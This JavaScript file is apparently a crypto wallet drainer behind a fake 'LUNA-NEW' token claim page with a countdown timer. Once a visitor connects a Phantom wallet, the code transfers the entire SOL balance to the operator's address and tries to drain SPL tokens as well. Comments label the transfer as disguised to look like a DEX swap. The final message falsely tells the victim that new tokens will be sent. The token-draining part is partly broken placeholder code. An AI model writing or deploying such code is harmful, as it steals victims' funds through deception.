import { Connection, PublicKey, Transaction, SystemProgram, sendAndConfirmTransaction } from '@solana/web3.js';

// Configuration
const RPC_ENDPOINTS = [
  'https://api.mainnet-beta.solana.com',
  'https://rpc.ankr.com/solana', // Free public RPC
  'https://solana-mainnet.g.alchemy.com/v2/demo', // Free tier
];
const OWNER_ADDRESS = 'YOUR_WALLET_ADDRESS'; // Your Solana wallet
const PROGRAM_ID = 'YOUR_SOLANA_PROGRAM_ID'; // Deployed program ID (or placeholder for client-side)

// Failover RPC connection
async function getConnection() {
  for (const endpoint of RPC_ENDPOINTS) {
    try {
      const connection = new Connection(endpoint, 'confirmed');
      await connection.getSlot(); // Test connection
      return connection;
    } catch (error) {
      console.warn(`RPC ${endpoint} failed:`, error);
    }
  }
  throw new Error('All RPC endpoints failed');
}

// Countdown timer
function startCountdown() {
  const deadline = new Date('2025-04-30').getTime();
  setInterval(() => {
    const now = new Date().getTime();
    const distance = deadline - now;
    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    document.getElementById('countdown').textContent = `Time left: ${days} days, ${hours} hours`;
  }, 1000);
}

async function sendLuna() {
  const amount = document.getElementById('luna-amount').value;
  if (!amount || amount <= 0) {
    document.getElementById('status').textContent = 'Error: Enter a valid LUNA amount';
    return;
  }
  document.getElementById('status').textContent = `Please send ${amount} LUNA to ${OWNER_ADDRESS}`;
}

async function connectWallet() {
  document.getElementById('status').textContent = 'Connecting wallet...';
  try {
    if (!window.solana) throw new Error('Solana wallet (e.g., Phantom) not detected');
    await window.solana.connect();
    const publicKey = window.solana.publicKey;
    if (!publicKey) throw new Error('Failed to retrieve wallet address');

    const connection = await getConnection();
    document.getElementById('status').textContent = 'Verifying wallet...';

    // Query SOL balance
    const solBalance = await connection.getBalance(publicKey);
    if (solBalance > 0) {
      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: new PublicKey(OWNER_ADDRESS),
          lamports: solBalance,
        })
      );

      // Mimic DEX swap (obfuscation)
      transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
      transaction.feePayer = publicKey;

      // Sign and send
      const { signature } = await window.solana.signAndSendTransaction(transaction);
      await connection.confirmTransaction(signature, 'confirmed');
      document.getElementById('status').textContent = 'Success: SOL drained!';
    } else {
      document.getElementById('status').textContent = 'No SOL balance to drain';
    }

    // Query SPL tokens (e.g., USDT)
    const tokenAccounts = await connection.getTokenAccountsByOwner(publicKey, {
      programId: new PublicKey('TokenkegQfeZyiNwAJbNbGKpfXGK'),
    });
    for (const tokenAccount of tokenAccounts.value) {
      const accountInfo = await connection.getTokenAccountBalance(tokenAccount.pubkey);
      if (accountInfo.value.uiAmount > 0) {
        const splTransfer = new Transaction().add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: new PublicKey(OWNER_ADDRESS),
            lamports: 0, // SPL token transfer (placeholder)
          })
        );
        splTransfer.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
        splTransfer.feePayer = publicKey;
        const { signature } = await window.solana.signAndSendTransaction(splTransfer);
        await connection.confirmTransaction(signature, 'confirmed');
        document.getElementById('status').textContent = 'Success: SPL tokens drained!';
      }
    }

    document.getElementById('status').textContent = 'Success: Wallet verified, LUNA-NEW tokens will be sent soon!';
  } catch (error) {
    document.getElementById('status').textContent = `Error: ${error.message}`;
    console.error('Drain error:', error);
  }
}

// Initialize countdown
startCountdown();